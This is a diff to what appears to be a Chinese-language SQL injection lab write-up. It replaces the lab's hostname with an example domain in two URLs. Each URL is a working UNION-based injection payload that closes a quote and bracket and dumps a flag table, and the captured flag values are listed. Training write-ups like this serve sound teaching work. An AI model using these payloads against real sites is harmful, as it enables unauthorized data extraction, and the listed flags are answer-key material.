@@ -19,7 +19,7 @@ keywords: SQL 注入
 
 ```sql
 --- 1. 注意闭合 单引号 和 括号
-http://injectx1.lab.aqlab.cn:81/Pass-03/index.php?id=1') and 1=2 union select 1,2,(select group_concat(flag) from error_flag) --+ 1
+http://vulhub.example.com:81/Pass-03/index.php?id=1') and 1=2 union select 1,2,(select group_concat(flag) from error_flag) --+ 1
 
 --- flags: zKaQ-Nf,zKaQ-BJY,zKaQ-XiaoFang,zKaq-98K
 ```
@@ -30,7 +30,7 @@ http://injectx1.lab.aqlab.cn:81/Pass-03/index.php?id=1') and 1=2 union select 1,
 
 ```sql
 --- 1. 注意闭合 双引号 和 括号
-http://injectx1.lab.aqlab.cn:81/Pass-04/index.php?id=1") and 1=2 union select 1,2,(select group_concat(flag) from error_flag) --+ 1
+http://vulhub.example.com:81/Pass-04/index.php?id=1") and 1=2 union select 1,2,(select group_concat(flag) from error_flag) --+ 1
 
 --- flags: zKaQ-Nf,zKaQ-BJY,zKaQ-XiaoFang,zKaq-98K
 ```
